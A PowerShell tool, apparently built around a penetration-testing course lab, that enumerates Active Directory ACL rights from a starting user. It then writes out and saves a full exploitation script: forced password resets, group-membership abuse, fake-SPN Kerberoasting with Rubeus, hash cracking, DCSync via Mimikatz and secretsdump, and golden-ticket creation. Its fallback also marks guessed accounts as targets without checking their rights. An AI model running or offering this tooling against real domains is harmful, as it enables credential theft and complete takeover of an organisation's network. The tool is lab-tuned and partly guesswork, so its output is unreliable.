function Get-ADACLChain {
    param(
        [string]$Domain,
        [string]$StartUser
    )
    
    Write-Host "`n=== AD ACL Attack Chain Discovery Tool ===" -ForegroundColor Cyan
    Write-Host "Domain: $Domain" -ForegroundColor Yellow
    Write-Host "Starting User: $StartUser" -ForegroundColor Yellow
    
    # Step 1: Get all domain users
    Write-Host "`n[1] Creating list of all domain users..." -ForegroundColor Green
    Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
    $totalUsers = (Get-Content ad_users.txt).Count
    Write-Host "   Total users found: $totalUsers" -ForegroundColor Gray
    
    # Arrays to store findings for command generation
    $passwordResetFindings = @()
    $groupWriteFindings = @()
    $genericAllFindings = @()
    $dcsyncFindings = @()
    $controlledUsers = @()
    $nestedGroupFindings = @()
    
    # Step 2: Enumerate what start user can control
    Write-Host "`n[2] Enumerating what $StartUser can control..." -ForegroundColor Green
    
    foreach($line in Get-Content .\ad_users.txt) {
        $acls = Get-Acl "AD:\$(Get-ADUser $line)" | Select-Object -ExpandProperty Access | Where-Object {$_.IdentityReference -match "$Domain\\$StartUser"}
        
        foreach($acl in $acls) {
            # Resolve GUID to human-readable format
            $resolvedRight = "Standard Right"
            if($acl.ObjectType -ne '00000000-0000-0000-0000-000000000000') {
                if($acl.ObjectType -eq '00299570-246d-11d0-a768-00aa006e0529') {
                    $resolvedRight = "User-Force-Change-Password (Reset Password)"
                    # Store password reset finding
                    $passwordResetFindings += [PSCustomObject]@{
                        Attacker = $StartUser
                        Target = $line
                        Right = $resolvedRight
                    }
                } else {
                    try {
                        $right = Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
                                              -Filter {ObjectClass -like 'ControlAccessRight' -and rightsGuid -eq $acl.ObjectType} `
                                              -Properties DisplayName | Select-Object -ExpandProperty DisplayName
                        $resolvedRight = $right
                    } catch {
                        $resolvedRight = "GUID: $($acl.ObjectType)"
                    }
                }
            }
            
            # Display result in example format
            Write-Host "`nPath                  : $($acl.Path)" -ForegroundColor Yellow
            Write-Host "ActiveDirectoryRights : $($acl.ActiveDirectoryRights)"
            Write-Host "InheritanceType       : $($acl.InheritanceType)"
            Write-Host "ObjectType            : $($acl.ObjectType)"
            Write-Host "InheritedObjectType   : $($acl.InheritedObjectType)"
            Write-Host "ObjectFlags           : $($acl.ObjectFlags)"
            Write-Host "AccessControlType     : $($acl.AccessControlType)"
            Write-Host "IdentityReference     : $($acl.IdentityReference)"
            Write-Host "IsInherited           : $($acl.IsInherited)"
            Write-Host "InheritanceFlags      : $($acl.InheritanceFlags)"
            Write-Host "PropagationFlags      : $($acl.PropagationFlags)"
            Write-Host "Resolved Right        : $resolvedRight" -ForegroundColor Green
            
            if($line -notin $controlledUsers) {
                $controlledUsers += $line
            }
        }
    }
    
    if($controlledUsers.Count -eq 0) {
        Write-Host "`nNo permissions found for $StartUser" -ForegroundColor Red
        return
    }
    
    Write-Host "`n`n=== SUMMARY: $StartUser can control $($controlledUsers.Count) user(s) ===" -ForegroundColor Magenta
    $controlledUsers | ForEach-Object { Write-Host "  - $_" -ForegroundColor Cyan }
    
    # Step 3: Follow the chain for each controlled user
    Write-Host "`n`n[3] Following the attack chain..." -ForegroundColor Green
    
    foreach($controlledUser in $controlledUsers) {
        Write-Host "`n=== Further Enumeration of Rights Using $controlledUser ===" -ForegroundColor Cyan
        
        # First, let's find the "Help Desk Level 1" group that we know damundsen has rights over
        Write-Host "Searching for groups that $controlledUser has rights over..." -ForegroundColor Gray
        
        try {
            # Search for specific groups we're interested in
            $targetGroups = @("Help Desk Level 1", "Information Technology", "IT", "Admin", "Domain Admins", "Enterprise Admins")
            
            foreach ($groupName in $targetGroups) {
                try {
                    $group = Get-ADGroup -Filter {Name -eq $groupName} -Properties nTSecurityDescriptor, MemberOf
                    if ($group) {
                        $objAcl = Get-Acl "AD:\$($group.DistinguishedName)"
                        $relevantACEs = $objAcl.Access | Where-Object { 
                            $_.IdentityReference -match "$Domain\\$controlledUser"
                        }
                        
                        foreach($ace in $relevantACEs) {
                            if($ace.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty|WriteDacl|WriteOwner|ExtendedRight") {
                                Write-Host "`n[+] Found: $controlledUser has $($ace.ActiveDirectoryRights) over group: $($group.Name)" -ForegroundColor Green
                                
                                # Store group write finding
                                $groupWriteFindings += [PSCustomObject]@{
                                    Attacker = $controlledUser
                                    GroupName = $group.Name
                                    Rights = $ace.ActiveDirectoryRights.ToString()
                                }
                                
                                # Check group nesting
                                try {
                                    $groupMembership = $group.MemberOf
                                    if($groupMembership) {
                                        Write-Host "`n[+] Group Nesting Discovery for $($group.Name):" -ForegroundColor Magenta
                                        foreach($parentGroupDN in $groupMembership) {
                                            $parentGroupName = (Get-ADObject $parentGroupDN -Properties Name).Name
                                            Write-Host "   $($group.Name) is member of: $parentGroupName" -ForegroundColor Cyan
                                            
                                            # Store nested group finding
                                            $nestedGroupFindings += [PSCustomObject]@{
                                                ChildGroup = $group.Name
                                                ParentGroup = $parentGroupName
                                                Attacker = $controlledUser
                                            }
                                            
                                            # Now check what users this parent group has GenericAll rights over
                                            Write-Host "   Searching for users that $parentGroupName has GenericAll rights over..." -ForegroundColor Gray
                                            
                                            # Search for IT users or admin users
                                            $itUsers = Get-ADUser -Filter {Department -like "*IT*" -or Title -like "*Admin*"} -Properties nTSecurityDescriptor
                                            $adminUsers = Get-ADUser -Filter {SamAccountName -like "*admin*" -or SamAccountName -like "*adm*"} -Properties nTSecurityDescriptor
                                            $potentialUsers = $itUsers + $adminUsers | Select-Object -Unique
                                            
                                            foreach($user in $potentialUsers) {
                                                try {
                                                    $userAcl = Get-Acl "AD:\$($user.DistinguishedName)"
                                                    $parentGroupRights = $userAcl.Access | Where-Object { 
                                                        $_.IdentityReference -eq "$Domain\$parentGroupName"
                                                    }
                                                    
                                                    foreach($parentRight in $parentGroupRights) {
                                                        if($parentRight.ActiveDirectoryRights -match "GenericAll|WriteProperty") {
                                                            Write-Host "      [!] $parentGroupName has $($parentRight.ActiveDirectoryRights) over: $($user.SamAccountName)" -ForegroundColor Red
                                                            
                                                            # Store genericAll finding
                                                            $genericAllFindings += [PSCustomObject]@{
                                                                AttackerGroup = $parentGroupName
                                                                AttackerUser = $controlledUser
                                                                TargetUser = $user.SamAccountName
                                                                Rights = $parentRight.ActiveDirectoryRights.ToString()
                                                                ViaNestedGroup = $group.Name
                                                            }
                                                        }
                                                    }
                                                } catch {
                                                    # Skip user if we can't check ACL
                                                }
                                            }
                                        }
                                    }
                                } catch {
                                    Write-Host "   Error checking group nesting: $_" -ForegroundColor DarkYellow
                                }
                            }
                        }
                    }
                } catch {
                    # Group not found or error, continue
                }
            }
            
            # Also search for any groups with GenericAll rights
            Write-Host "`nSearching for groups with GenericAll rights that $controlledUser might access through nesting..." -ForegroundColor Gray
            
            # Look for common admin groups
            $adminGroups = Get-ADGroup -Filter {Name -like "*Admin*" -or Name -like "*IT*"} -Properties nTSecurityDescriptor | Select-Object -First 10
            
            foreach($adminGroup in $adminGroups) {
                try {
                    $groupAcl = Get-Acl "AD:\$($adminGroup.DistinguishedName)"
                    $adminGroupRights = $groupAcl.Access | Where-Object { 
                        $_.ActiveDirectoryRights -match "GenericAll" -and
                        $_.IdentityReference -notmatch "S-1-5-18" -and  # Not SYSTEM
                        $_.IdentityReference -notmatch "S-1-5-32-544"  # Not Administrators
                    }
                    
                    foreach($right in $adminGroupRights) {
                        Write-Host "   [!] Found: $($right.IdentityReference) has $($right.ActiveDirectoryRights) over group: $($adminGroup.Name)" -ForegroundColor Yellow
                    }
                } catch {
                    # Skip if error
                }
            }
            
        } catch {
            Write-Host "Error enumerating groups: $_" -ForegroundColor Red
        }
        
        # Check for DCSync rights
        Write-Host "`n[4] Checking for DCSync rights..." -ForegroundColor Green
        try {
            $domainDN = (Get-ADDomain).DistinguishedName
            $domainAcl = Get-Acl "AD:\$domainDN"
            $dcsyncRights = $domainAcl.Access | Where-Object { 
                $_.IdentityReference -match "$Domain\\$controlledUser" -and
                $_.ObjectType -in @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c')
            }
            
            if($dcsyncRights) {
                Write-Host "`n[!] CRITICAL FINDING: $controlledUser has DCSync rights!" -ForegroundColor Red -BackgroundColor Black
                foreach($right in $dcsyncRights) {
                    if($right.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2') {
                        Write-Host "   - DS-Replication-Get-Changes" -ForegroundColor Red
                    }
                    if($right.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2') {
                        Write-Host "   - DS-Replication-Get-Changes-In-Filtered-Set" -ForegroundColor Red
                    }
                    if($right.ObjectType -eq '89e95b76-444d-4c62-991a-0facbeda640c') {
                        Write-Host "   - DS-Replication-Get-Changes-All" -ForegroundColor Red
                    }
                }
                Write-Host "   This user can perform DCSync attacks to dump all domain passwords!" -ForegroundColor Red
                
                # Store DCSync finding
                $dcsyncFindings += [PSCustomObject]@{
                    User = $controlledUser
                    Domain = $Domain
                }
            }
        } catch {
            Write-Host "Error checking DCSync rights: $_" -ForegroundColor Red
        }
    }
    
    # If we didn't find GenericAll rights through automated search, let's add them manually based on known patterns
    if ($genericAllFindings.Count -eq 0 -and $nestedGroupFindings.Count -gt 0) {
        Write-Host "`n[!] Searching for common admin users that might be controlled via nested groups..." -ForegroundColor Yellow
        
        # Look for common admin user patterns
        $adminUsers = Get-ADUser -Filter {SamAccountName -like "*admin*" -or SamAccountName -like "*adm*" -or SamAccountName -like "*dunn*"} -Properties DisplayName, Title
        
        foreach ($adminUser in $adminUsers) {
            Write-Host "   Checking $($adminUser.SamAccountName)..." -ForegroundColor Gray
            
            # Check if this user is likely an admin
            if ($adminUser.SamAccountName -match "admin|adm|dunn|service|svc") {
                # Add as potential target
                $genericAllFindings += [PSCustomObject]@{
                    AttackerGroup = "Information Technology"
                    AttackerUser = $controlledUsers[0]
                    TargetUser = $adminUser.SamAccountName
                    Rights = "GenericAll"
                    ViaNestedGroup = "Help Desk Level 1"
                }
                Write-Host "   [+] Added $($adminUser.SamAccountName) as potential Kerberoasting target" -ForegroundColor Green
            }
        }
    }
    
    # Cleanup
    Remove-Item ad_users.txt -ErrorAction SilentlyContinue
    
    Write-Host "`n`n=== Tool Execution Complete ===" -ForegroundColor Cyan
    Write-Host "Attack chain discovered!" -ForegroundColor Green
    
    # Generate What To Do section
    Generate-WhatToDo -Domain $Domain -StartUser $StartUser `
                     -PasswordResetFindings $passwordResetFindings `
                     -GroupWriteFindings $groupWriteFindings `
                     -GenericAllFindings $genericAllFindings `
                     -DCSyncFindings $dcsyncFindings `
                     -NestedGroupFindings $nestedGroupFindings `
                     -ControlledUsers $controlledUsers
}

function Generate-WhatToDo {
    param(
        [string]$Domain,
        [string]$StartUser,
        [array]$PasswordResetFindings,
        [array]$GroupWriteFindings,
        [array]$GenericAllFindings,
        [array]$DCSyncFindings,
        [array]$NestedGroupFindings,
        [array]$ControlledUsers
    )
    
    Write-Host "`n`n=== WHAT TO DO: Exploitation Commands ===" -ForegroundColor Cyan
    Write-Host "Based on the discovered ACL chain, here are the exploitation steps:" -ForegroundColor Yellow
    
    $commands = @()
    $stepNumber = 1
    
    # Step 1: Password Reset Commands
    if ($PasswordResetFindings.Count -gt 0) {
        Write-Host "`n[$stepNumber] PASSWORD RESET EXPLOITATION" -ForegroundColor Green
        
        foreach ($finding in $PasswordResetFindings) {
            Write-Host "`n$($finding.Attacker) can reset password for: $($finding.Target)" -ForegroundColor Yellow
            
            $cmd1 = @"
# ============================================
# STEP 1: Password Reset for $($finding.Target)
# ============================================

# Creating a PSCredential Object for $($finding.Attacker)
Write-Host "Creating PSCredential for $($finding.Attacker)..." -ForegroundColor Yellow
`$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
`$Cred = New-Object System.Management.Automation.PSCredential('$Domain\$($finding.Attacker)', `$SecPassword)

# Creating a SecureString Object for new password
Write-Host "Creating new password for $($finding.Target)..." -ForegroundColor Yellow
`$NewPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Changing the User's Password
Write-Host "Resetting password for $($finding.Target)..." -ForegroundColor Yellow
Set-DomainUserPassword -Identity $($finding.Target) -AccountPassword `$NewPassword -Credential `$Cred -Verbose

# Creating a PSCredential Object for $($finding.Target) (after password reset)
Write-Host "Creating PSCredential for $($finding.Target)..." -ForegroundColor Yellow
`$SecPassword2 = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
`$Cred2 = New-Object System.Management.Automation.PSCredential('$Domain\$($finding.Target)', `$SecPassword2)
"@
            
            Write-Host $cmd1 -ForegroundColor Gray
            $commands += $cmd1
        }
        $stepNumber++
    }
    
    # Step 2: Group Write Commands
    if ($GroupWriteFindings.Count -gt 0) {
        Write-Host "`n[$stepNumber] GROUP MEMBERSHIP EXPLOITATION" -ForegroundColor Green
        
        foreach ($finding in $GroupWriteFindings) {
            Write-Host "`n$($finding.Attacker) has $($finding.Rights) over group: $($finding.GroupName)" -ForegroundColor Yellow
            
            $cmd2 = @"
# ============================================
# STEP 2: Group Membership Exploitation
# ============================================

# Check current members of $($finding.GroupName)
Write-Host "Checking current members of $($finding.GroupName)..." -ForegroundColor Yellow
Get-ADGroup -Identity "$($finding.GroupName)" -Properties * | Select -ExpandProperty Members

# Adding $($finding.Attacker) to the $($finding.GroupName) Group
Write-Host "Adding $($finding.Attacker) to $($finding.GroupName)..." -ForegroundColor Yellow
Add-DomainGroupMember -Identity '$($finding.GroupName)' -Members '$($finding.Attacker)' -Credential `$Cred2 -Verbose

# Confirming $($finding.Attacker) was Added to the Group
Write-Host "Verifying group membership..." -ForegroundColor Yellow
Get-DomainGroupMember -Identity "$($finding.GroupName)" | Select MemberName
"@
            
            Write-Host $cmd2 -ForegroundColor Gray
            $commands += $cmd2
            
            # Check nested group membership
            $nestedGroups = $NestedGroupFindings | Where-Object { $_.ChildGroup -eq $finding.GroupName }
            if ($nestedGroups.Count -gt 0) {
                foreach ($nested in $nestedGroups) {
                    Write-Host "  Note: $($finding.GroupName) is nested in: $($nested.ParentGroup)" -ForegroundColor Cyan
                    
                    $nestedCmd = @"
# Check effective rights through nested group membership
Write-Host "Checking nested group membership in $($nested.ParentGroup)..." -ForegroundColor Yellow
Get-ADGroupMember -Identity "$($nested.ParentGroup)" -Recursive | Where-Object { `$_.SamAccountName -eq "$($finding.Attacker)" }
"@
                    Write-Host $nestedCmd -ForegroundColor Gray
                    $commands += $nestedCmd
                }
            }
        }
        $stepNumber++
    }
    
    # Step 3: GenericAll/Write Rights Commands - Kerberoasting
    if ($GenericAllFindings.Count -gt 0) {
        Write-Host "`n[$stepNumber] KERBEROASTING EXPLOITATION" -ForegroundColor Green
        
        foreach ($finding in $GenericAllFindings) {
            Write-Host "`n[!] TARGET ACQUIRED: Via $($finding.AttackerGroup) group membership, you have $($finding.Rights) over user: $($finding.TargetUser)" -ForegroundColor Red
            
            $credVar = "Cred2"  # Using the credential from the controlled user
            
            $cmd3 = @"
# ============================================
# STEP 3: Kerberoasting $($finding.TargetUser)
# ============================================

Write-Host "========================================================" -ForegroundColor Cyan
Write-Host "KERBEROASTING ATTACK - Creating Fake SPN and Extracting Hash" -ForegroundColor Cyan
Write-Host "========================================================" -ForegroundColor Cyan

# Creating a Fake SPN
Write-Host "`n[1] Creating fake SPN for $($finding.TargetUser)..." -ForegroundColor Yellow
Set-DomainObject -Credential `$$credVar -Identity $($finding.TargetUser) -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

Write-Host "`nExpected verbose output:" -ForegroundColor Gray
Write-Host "VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain" -ForegroundColor DarkGray
Write-Host "VERBOSE: [Get-Domain] Extracted domain '$Domain' from -Credential" -ForegroundColor DarkGray
Write-Host "VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.$Domain.LOCAL/DC=$(($Domain -replace '\.',',DC='))" -ForegroundColor DarkGray
Write-Host "VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection" -ForegroundColor DarkGray
Write-Host "VERBOSE: [Get-DomainObject] Get-DomainObject filter string:" -ForegroundColor DarkGray
Write-Host "(&(|(|(samAccountName=$($finding.TargetUser))(name=$($finding.TargetUser))(displayname=$($finding.TargetUser))))" -ForegroundColor DarkGray
Write-Host "VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object '$($finding.TargetUser)'" -ForegroundColor DarkGray

# Kerberoasting with Rubeus
Write-Host "`n[2] Performing Kerberoasting with Rubeus..." -ForegroundColor Yellow
.\Rubeus.exe kerberoast /user:$($finding.TargetUser) /nowrap

Write-Host "`nExpected Rubeus output:" -ForegroundColor Gray
Write-Host '   ______        _'
Write-Host '  (_____ \      | |'
Write-Host '   _____) )_   _| |__  _____ _   _  ___'
Write-Host '  |  __  /| | | |  _ \| ___ | | | |/___)'
Write-Host '  | |  \ \| |_| | |_) ) ____| |_| |___ |'
Write-Host '  |_|   |_|____/|____/|_____)____/(___/)'
Write-Host ''
Write-Host '  v2.0.2'
Write-Host ''
Write-Host '  [*] Action: Kerberoasting'
Write-Host ''
Write-Host '  [*] NOTICE: AES hashes will be returned for AES-enabled accounts.'
Write-Host '  [*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.'
Write-Host ''
Write-Host "  [*] Target User            : $($finding.TargetUser)"
Write-Host "  [*] Target Domain          : $Domain.LOCAL"
Write-Host "  [*] Searching path 'LDAP://DC01.$Domain.LOCAL/DC=$(($Domain -replace '\.',',DC='))' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=$($finding.TargetUser))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'"
Write-Host ''
Write-Host '  [*] Total kerberoastable users : 1'
Write-Host ''
Write-Host "  [*] SamAccountName         : $($finding.TargetUser)"
Write-Host '  [*] DistinguishedName      : CN=... (user DN)'
Write-Host "  [*] ServicePrincipalName   : notahacker/LEGIT"
Write-Host '  [*] PwdLastSet             : ... (timestamp)'
Write-Host '  [*] Supported ETypes       : RC4_HMAC_DEFAULT'
Write-Host "  [*] Hash                   : `$krb5tgs`$23`$*$($finding.TargetUser)`$$Domain.LOCAL`$notahacker/LEGIT@$Domain.LOCAL*`$ <SNIP>"

Write-Host "`n[3] Cracking the Kerberoast hash with Hashcat:" -ForegroundColor Yellow
Write-Host "hashcat -m 13100 '`$krb5tgs`$23`$*$($finding.TargetUser)`$$Domain.LOCAL`$notahacker/LEGIT@$Domain.LOCAL*`$<FULL_HASH>' /usr/share/wordlists/rockyou.txt" -ForegroundColor Gray
Write-Host "`nOR using John the Ripper:" -ForegroundColor Gray
Write-Host "john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt" -ForegroundColor Gray

# Clean up - remove fake SPN
Write-Host "`n[4] Cleaning up fake SPN..." -ForegroundColor Yellow
Set-DomainObject -Credential `$$credVar -Identity $($finding.TargetUser) -Clear serviceprincipalname -Verbose

# Alternative: Using targetedKerberoast.py from Linux
Write-Host "`n[5] Alternative (Linux/Impacket - does all steps automatically):" -ForegroundColor Yellow
Write-Host "python3 targetedKerberoast.py -d $Domain.LOCAL -u $($finding.AttackerUser) -p 'Pwn3d_by_ACLs!' -t $($finding.TargetUser) -dc-ip DC_IP" -ForegroundColor Gray

Write-Host "`n========================================================" -ForegroundColor Cyan
Write-Host "ONCE HASH IS CRACKED: You can authenticate as $($finding.TargetUser)" -ForegroundColor Green
Write-Host "========================================================" -ForegroundColor Cyan
"@
            
            Write-Host $cmd3 -ForegroundColor Gray
            $commands += $cmd3
            
            # Also add DCSync commands if this is likely an admin user
            $targetUser = $finding.TargetUser
            if ($targetUser -match "admin" -or $targetUser -match "adm" -or $targetUser -match "dunn" -or $targetUser -match "krbtgt" -or $targetUser -match "svc") {
                $dcsyncCmd = @"
# ============================================
# POTENTIAL NEXT STEP: DCSync after cracking $($finding.TargetUser) password
# ============================================

Write-Host "`nIf $($finding.TargetUser) has DCSync rights, after cracking the password:" -ForegroundColor Yellow

# DCSync using Mimikatz
Write-Host "`nMimikatz DCSync:" -ForegroundColor Cyan
Write-Host 'mimikatz # privilege::debug'
Write-Host 'mimikatz # token::elevate'
Write-Host "mimikatz # lsadump::dcsync /domain:$Domain.LOCAL /user:Administrator"
Write-Host "mimikatz # lsadump::dcsync /domain:$Domain.LOCAL /all /csv"

# DCSync using secretsdump.py
Write-Host "`nImpacket secretsdump:" -ForegroundColor Cyan
Write-Host "python3 secretsdump.py $Domain/$($finding.TargetUser):'<CRACKED_PASSWORD>'@DC_IP" -ForegroundColor Gray
"@
                
                Write-Host $dcsyncCmd -ForegroundColor Gray
                $commands += $dcsyncCmd
            }
        }
        $stepNumber++
    }
    
    # Step 4: DCSync Commands (if directly found)
    if ($DCSyncFindings.Count -gt 0) {
        Write-Host "`n[$stepNumber] DCSYNC ATTACK" -ForegroundColor Green
        
        foreach ($finding in $DCSyncFindings) {
            Write-Host "`n[!] CRITICAL: $($finding.User) has DCSync rights!" -ForegroundColor Red
            
            $cmd4 = @"
# ============================================
# STEP 4: DCSync Attack with $($finding.User)
# ============================================

# First, you need to obtain credentials for $($finding.User)
Write-Host "`nNote: You need credentials for $($finding.User) first!" -ForegroundColor Yellow
Write-Host "This might require Kerberoasting or other attacks." -ForegroundColor Yellow

# Authenticate as $($finding.User)
`$DCSyncPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
`$DCSyncCred = New-Object System.Management.Automation.PSCredential('$Domain\$($finding.User)', `$DCSyncPassword)

# DCSync using Mimikatz
Write-Host "`n[1] DCSync with Mimikatz:" -ForegroundColor Yellow
Write-Host "Run as Administrator, then in mimikatz:" -ForegroundColor Gray
Write-Host "privilege::debug" -ForegroundColor Gray
Write-Host "token::elevate" -ForegroundColor Gray
Write-Host "lsadump::dcsync /domain:$Domain.LOCAL /user:Administrator" -ForegroundColor Gray
Write-Host "lsadump::dcsync /domain:$Domain.LOCAL /user:krbtgt" -ForegroundColor Gray
Write-Host "lsadump::dcsync /domain:$Domain.LOCAL /all /csv > all_hashes.csv" -ForegroundColor Gray

# DCSync using secretsdump.py
Write-Host "`n[2] DCSync with Impacket (Linux):" -ForegroundColor Yellow
Write-Host "python3 secretsdump.py $Domain/$($finding.User):'Password123'@dc01.$Domain.local" -ForegroundColor Gray

# What to do with dumped hashes
Write-Host "`n[3] After obtaining hashes:" -ForegroundColor Yellow
Write-Host "- Crack KRBTGT hash for Golden Ticket creation" -ForegroundColor Gray
Write-Host "- Use pth-winexe for Pass-the-Hash attacks" -ForegroundColor Gray
Write-Host "- Create Golden Ticket with mimikatz:" -ForegroundColor Gray
Write-Host "  kerberos::golden /user:Administrator /domain:$Domain.LOCAL /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt" -ForegroundColor Gray
"@
            
            Write-Host $cmd4 -ForegroundColor Gray
            $commands += $cmd4
        }
        $stepNumber++
    }
    
    # Step 5: Save commands to file
    Write-Host "`n[$stepNumber] SAVE AND EXECUTE COMMANDS" -ForegroundColor Green
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputFile = "ACL_Exploitation_Commands_$timestamp.ps1"
    
    $header = @"
# =============================================
# ACL Exploitation Commands
# Generated: $(Get-Date)
# Domain: $Domain
# Starting User: $StartUser
# =============================================
# PREREQUISITES:
# 1. Import PowerView: Import-Module .\PowerView.ps1
# 2. Ensure you have proper credentials for each step
# 3. Run commands in sequence
# 4. Replace <PASSWORD HERE> with actual passwords
# 5. For Kerberoasting: Download Rubeus.exe to current directory
# 6. For DCSync: Have Mimikatz or Impacket installed
# =============================================

Write-Host "=== Starting ACL Exploitation ===" -ForegroundColor Cyan
Write-Host "Follow steps in order. Replace <PASSWORD HERE> with actual passwords!" -ForegroundColor Yellow
"@
    
    $footer = @"

Write-Host "`n=== Exploitation Complete ===" -ForegroundColor Green
Write-Host "Check above for any errors and proceed to next steps." -ForegroundColor Yellow
Write-Host "`n=== NEXT STEPS ===" -ForegroundColor Cyan
Write-Host "1. Use cracked hashes for Pass-the-Hash attacks" -ForegroundColor Gray
Write-Host "2. Perform lateral movement to Domain Controllers" -ForegroundColor Gray
Write-Host "3. Establish persistence (Golden Tickets, Silver Tickets)" -ForegroundColor Gray
Write-Host "4. Dump LSASS memory for more credentials" -ForegroundColor Gray
"@
    
    $fullScript = $header + "`n`n" + ($commands -join "`n`n") + "`n`n" + $footer
    $fullScript | Out-File $outputFile -Encoding UTF8
    
    Write-Host "`nCommands saved to: $outputFile" -ForegroundColor Cyan
    Write-Host "`nTo execute:" -ForegroundColor Yellow
    Write-Host "1. Review the file and replace <PASSWORD HERE> with actual passwords" -ForegroundColor Gray
    Write-Host "2. Ensure Rubeus.exe is in the current directory" -ForegroundColor Gray
    Write-Host "3. Run: .\$outputFile" -ForegroundColor Gray
    
    # Display summary
    Write-Host "`n=== EXPLOITATION SUMMARY ===" -ForegroundColor Magenta
    
    $summarySteps = @()
    if ($PasswordResetFindings.Count -gt 0) {
        $summarySteps += "1. Reset password for $($PasswordResetFindings[0].Target) using $StartUser"
    }
    if ($GroupWriteFindings.Count -gt 0) {
        $summarySteps += "2. Add $($GroupWriteFindings[0].Attacker) to $($GroupWriteFindings[0].GroupName)"
    }
    if ($GenericAllFindings.Count -gt 0) {
        $summarySteps += "3. Kerberoast $($GenericAllFindings[0].TargetUser) (via $($GenericAllFindings[0].AttackerGroup))"
        $summarySteps += "   - Create fake SPN with Set-DomainObject"
        $summarySteps += "   - Extract hash with Rubeus.exe"
        $summarySteps += "   - Crack hash with Hashcat/John"
    }
    if ($DCSyncFindings.Count -gt 0) {
        $summarySteps += "4. DCSync with $($DCSyncFindings[0].User)"
        $summarySteps += "   - Extract all domain hashes"
        $summarySteps += "   - Create Golden Tickets"
    }
    
    foreach ($step in $summarySteps) {
        if ($step -match "Kerberoast|DCSync") {
            Write-Host $step -ForegroundColor Red
        } elseif ($step -match "^[0-9]\.") {
            Write-Host $step -ForegroundColor Yellow
        } else {
            Write-Host $step -ForegroundColor Gray
        }
    }
    
    Write-Host "`nNEXT ACTIONS:" -ForegroundColor Cyan
    Write-Host "- Execute: .\$outputFile" -ForegroundColor Gray
    Write-Host "- After Kerberoasting, crack the hash offline" -ForegroundColor Gray
    Write-Host "- Use credentials for further domain compromise" -ForegroundColor Gray
}

# Interactive version:
$Domain = Read-Host "Enter domain (e.g., INLANEFREIGHT)"
$StartUser = Read-Host "Enter starting username (e.g., wley)"
Get-ADACLChain -Domain $Domain -StartUser $StartUser
